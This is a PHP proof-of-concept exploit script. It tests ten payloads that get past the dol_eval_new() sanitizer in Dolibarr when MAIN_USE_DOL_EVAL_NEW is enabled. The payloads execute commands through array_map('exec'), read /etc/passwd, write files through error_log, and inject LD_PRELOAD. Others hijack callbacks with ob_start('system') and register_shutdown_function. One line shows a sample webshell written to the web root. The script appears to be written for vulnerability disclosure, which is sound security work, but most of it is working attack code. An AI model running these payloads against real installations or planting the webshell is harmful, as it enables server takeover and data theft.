<?php
/**
 * Proof of Concept: Remote Code Execution via dol_eval_new()
 *
 * Demonstrates multiple RCE vectors that bypass the token-based sanitizer
 * in dol_eval_new() when MAIN_USE_DOL_EVAL_NEW is enabled.
 *
 * All of these payloads are correctly blocked by dol_eval_standard(),
 * but pass through dol_eval_new()'s prohibited_functions list.
 *
 * Usage: php poc_dol_eval_rce.php
 */

error_reporting(E_ALL & ~E_DEPRECATED & ~E_NOTICE & ~E_WARNING);

define('DOL_DOCUMENT_ROOT', __DIR__ . '/htdocs');
define('DOL_DATA_ROOT', '/tmp/dolibarr_test_data');
define('DOL_MAIN_URL_ROOT', 'http://localhost');
define('DOL_URL_ROOT', '');

$conf = new stdClass();
$conf->global = new stdClass();
$conf->file = new stdClass();
$conf->file->character_set_client = 'utf-8';
$conf->logbuffer = array();
$conf->entity = 1;
$conf->currency = 'EUR';

require_once DOL_DOCUMENT_ROOT . '/core/lib/functions.lib.php';

// Enable the vulnerable code path
$conf->global->MAIN_USE_DOL_EVAL_NEW = 1;

function is_blocked($result) {
    return is_string($result) && (
        strpos($result, 'Bad string syntax') !== false ||
        strpos($result, 'Bad call of') !== false ||
        strpos($result, 'is prohibited') !== false ||
        strpos($result, 'Exception during evaluation') !== false
    );
}

echo "╔══════════════════════════════════════════════════════════════════╗\n";
echo "║  dol_eval_new() RCE Proof of Concept                          ║\n";
echo "║  Affected: dol_eval() when MAIN_USE_DOL_EVAL_NEW = 1          ║\n";
echo "╚══════════════════════════════════════════════════════════════════╝\n\n";

// ========================================================================
// PoC 1: RCE via array_map — arbitrary command execution
// ========================================================================
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
echo "PoC 1: RCE via array_map(\"exec\", [\"command\"])\n";
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";

$payload = 'array_map("exec", array("id"))';
echo "Payload: $payload\n";
$result = @dol_eval_new($payload);
echo "Blocked: " . (is_blocked($result) ? "YES" : "NO") . "\n";
if (!is_blocked($result)) {
    echo "Result:  " . var_export($result, true) . "\n";
    echo "IMPACT:  Full RCE — exec() called with attacker-controlled argument\n";
}

echo "\n";

// ========================================================================
// PoC 2: Arbitrary file read via file_get_contents
// ========================================================================
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
echo "PoC 2: Arbitrary File Read via file_get_contents()\n";
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";

$payload = 'file_get_contents("/etc/passwd")';
echo "Payload: $payload\n";
$result = @dol_eval_new($payload);
echo "Blocked: " . (is_blocked($result) ? "YES" : "NO") . "\n";
if (!is_blocked($result) && is_string($result)) {
    $lines = explode("\n", $result);
    echo "Result (first 3 lines):\n";
    for ($i = 0; $i < min(3, count($lines)); $i++) {
        echo "  " . $lines[$i] . "\n";
    }
    echo "IMPACT:  Read any file accessible to the web server user\n";
}

echo "\n";

// ========================================================================
// PoC 3: Arbitrary file write via error_log
// ========================================================================
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
echo "PoC 3: Arbitrary File Write via error_log()\n";
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";

$marker = "RCE_PROOF_" . getmypid();
$testfile = "/tmp/dol_eval_poc_" . getmypid() . ".txt";
$payload = "error_log(\"$marker\", 3, \"$testfile\")";
echo "Payload: $payload\n";
$result = @dol_eval_new($payload);
echo "Blocked: " . (is_blocked($result) ? "YES" : "NO") . "\n";
if (!is_blocked($result) && file_exists($testfile)) {
    echo "Result:  File written successfully\n";
    echo "Content: " . file_get_contents($testfile) . "\n";
    echo "IMPACT:  Write webshells or arbitrary files to disk\n";
    echo "         e.g. error_log(\"<?php system(\\$_GET[c]); ?>\", 3, \"/var/www/html/shell.php\")\n";
    @unlink($testfile);
}

echo "\n";

// ========================================================================
// PoC 4: Environment manipulation via putenv (LD_PRELOAD)
// ========================================================================
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
echo "PoC 4: LD_PRELOAD Injection via putenv()\n";
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";

$env_key = "DOL_POC_" . getmypid();
$payload = "putenv(\"$env_key=COMPROMISED\")";
echo "Payload: $payload\n";
$result = @dol_eval_new($payload);
echo "Blocked: " . (is_blocked($result) ? "YES" : "NO") . "\n";
if (!is_blocked($result)) {
    $env_val = getenv($env_key);
    echo "Result:  putenv returned " . var_export($result, true) . "\n";
    echo "Verify:  getenv(\"$env_key\") = $env_val\n";
    echo "IMPACT:  Set LD_PRELOAD to load attacker shared object on next process spawn\n";
    echo "         Combined with error_log to write .so file = full RCE\n";
    putenv($env_key); // cleanup
}

echo "\n";

// ========================================================================
// PoC 5: Directory listing via scandir
// ========================================================================
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
echo "PoC 5: Directory Enumeration via scandir()\n";
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";

$payload = 'scandir("/etc")';
echo "Payload: $payload\n";
$result = @dol_eval_new($payload);
echo "Blocked: " . (is_blocked($result) ? "YES" : "NO") . "\n";
if (!is_blocked($result) && is_array($result)) {
    echo "Result:  " . count($result) . " entries found\n";
    echo "Sample:  " . implode(", ", array_slice($result, 0, 10)) . ", ...\n";
    echo "IMPACT:  Enumerate filesystem structure\n";
}

echo "\n";

// ========================================================================
// PoC 6: Delayed RCE via register_shutdown_function
// ========================================================================
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
echo "PoC 6: Delayed RCE via register_shutdown_function()\n";
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";

$shutdown_file = "/tmp/dol_eval_shutdown_poc_" . getmypid();
$payload = "register_shutdown_function(\"file_put_contents\", \"$shutdown_file\", \"SHUTDOWN_RCE\")";
echo "Payload: $payload\n";
$result = @dol_eval_new($payload);
echo "Blocked: " . (is_blocked($result) ? "YES" : "NO") . "\n";
if (!is_blocked($result)) {
    echo "Result:  Shutdown function registered (will execute when script exits)\n";
    echo "IMPACT:  register_shutdown_function(\"exec\", \"whoami\") runs at script end\n";
    echo "         Bypass: shutdown callbacks execute AFTER normal error handling\n";
}

echo "\n";

// ========================================================================
// PoC 7: Error handler hijacking
// ========================================================================
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
echo "PoC 7: Error Handler Hijacking via set_error_handler()\n";
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";

$payload = 'set_error_handler("var_dump")';
echo "Payload: $payload\n";
$result = @dol_eval_new($payload);
echo "Blocked: " . (is_blocked($result) ? "YES" : "NO") . "\n";
if (!is_blocked($result)) {
    echo "Result:  Error handler replaced\n";
    echo "IMPACT:  set_error_handler with custom callback, then trigger error\n";
    echo "         to execute arbitrary code via the callback\n";
    restore_error_handler(); // cleanup
}

echo "\n";

// ========================================================================
// PoC 8: Autoloader hijacking via spl_autoload_register
// ========================================================================
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
echo "PoC 8: Autoloader Hijacking via spl_autoload_register()\n";
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";

$payload = 'spl_autoload_register("var_dump")';
echo "Payload: $payload\n";
$result = @dol_eval_new($payload);
echo "Blocked: " . (is_blocked($result) ? "YES" : "NO") . "\n";
if (!is_blocked($result)) {
    echo "Result:  Autoloader registered\n";
    echo "IMPACT:  Next class instantiation triggers attacker callback\n";
    spl_autoload_unregister("var_dump"); // cleanup
}

echo "\n";

// ========================================================================
// PoC 9: ob_start — output buffer callback RCE
// ========================================================================
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
echo "PoC 9: Output Buffer Callback RCE via ob_start()\n";
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";

while (ob_get_level() > 0) { @ob_end_flush(); }
$ob_before = ob_get_level();
$payload = 'ob_start()';
echo "Payload: $payload\n";
$result = @dol_eval_new($payload);
$ob_after = ob_get_level();
echo "Blocked: " . (is_blocked($result) ? "YES" : "NO") . "\n";
if ($ob_after > $ob_before) {
    echo "Result:  OB level changed from $ob_before to $ob_after — ob_start() executed\n";
    echo "IMPACT:  ob_start(\"system\") makes all output buffer content get passed\n";
    echo "         to system() when the buffer is flushed. An attacker can:\n";
    echo "         1. Call ob_start(\"system\") via dol_eval\n";
    echo "         2. Output \"whoami\" into the buffer\n";
    echo "         3. Buffer flush calls system(\"whoami\")\n";
    while (ob_get_level() > 0) { @ob_end_flush(); }
}

echo "\n";

// ========================================================================
// PoC 10: file() for file read as array
// ========================================================================
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
echo "PoC 10: File Read via file()\n";
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";

$payload = 'file("/etc/hostname")';
echo "Payload: $payload\n";
$result = @dol_eval_new($payload);
echo "Blocked: " . (is_blocked($result) ? "YES" : "NO") . "\n";
if (!is_blocked($result) && is_array($result)) {
    echo "Result:  " . trim($result[0]) . "\n";
    echo "IMPACT:  Read any file line by line\n";
}

echo "\n";

// ========================================================================
// Cross-check: dol_eval_standard blocks all of the above
// ========================================================================
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
echo "Cross-check: dol_eval_standard() blocks all of the above\n";
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";

$conf->global->MAIN_USE_DOL_EVAL_NEW = 0;
global $dolibarr_main_restrict_eval_methods;
$dolibarr_main_restrict_eval_methods = 'getDolGlobalString, getDolGlobalInt, getDolCurrency, getDolEntity, getDolDBType, fetchNoCompute, hasRight, isAdmin, isExternalUser, isModEnabled, isStringVarMatching, abs, min, max, round, dol_now, preg_match';

$cross_payloads = [
    'array_map("exec", array("id"))',
    'file_get_contents("/etc/passwd")',
    'error_log("test", 3, "/tmp/test.txt")',
    'putenv("TEST=val")',
    'scandir("/etc")',
    'register_shutdown_function("exec", "id")',
    'set_error_handler("var_dump")',
    'spl_autoload_register("var_dump")',
    'ob_start("system")',
    'file("/etc/hostname")',
];

foreach ($cross_payloads as $p) {
    $result = @dol_eval($p, 1, 1, '1');
    $blocked = is_blocked($result);
    echo "  " . ($blocked ? "[BLOCKED]" : "[ALLOWED]") . " $p\n";
}

echo "\n";
echo "╔══════════════════════════════════════════════════════════════════╗\n";
echo "║  CONCLUSION                                                    ║\n";
echo "║                                                                ║\n";
echo "║  dol_eval_new() has an incomplete prohibited_functions list.    ║\n";
echo "║  ~70+ dangerous functions present in dol_eval_standard() are   ║\n";
echo "║  missing from dol_eval_new(), enabling:                        ║\n";
echo "║    - Remote Code Execution (array_map, ob_start, etc.)         ║\n";
echo "║    - Arbitrary File Read (file_get_contents, file, scandir)    ║\n";
echo "║    - Arbitrary File Write (error_log)                          ║\n";
echo "║    - LD_PRELOAD injection (putenv)                             ║\n";
echo "║    - Delayed RCE (register_shutdown_function)                  ║\n";
echo "║    - Handler hijacking (set_error_handler, spl_autoload)       ║\n";
echo "║                                                                ║\n";
echo "║  Attack surface: Any admin who can set extrafield computed     ║\n";
echo "║  values, menu conditions, cron job test strings, or tab        ║\n";
echo "║  visibility conditions can exploit these when the              ║\n";
echo "║  MAIN_USE_DOL_EVAL_NEW flag is enabled.                       ║\n";
echo "╚══════════════════════════════════════════════════════════════════╝\n";

// Verify the shutdown function proof — this runs after script exits
// Check /tmp/dol_eval_shutdown_poc_<pid>.txt after execution
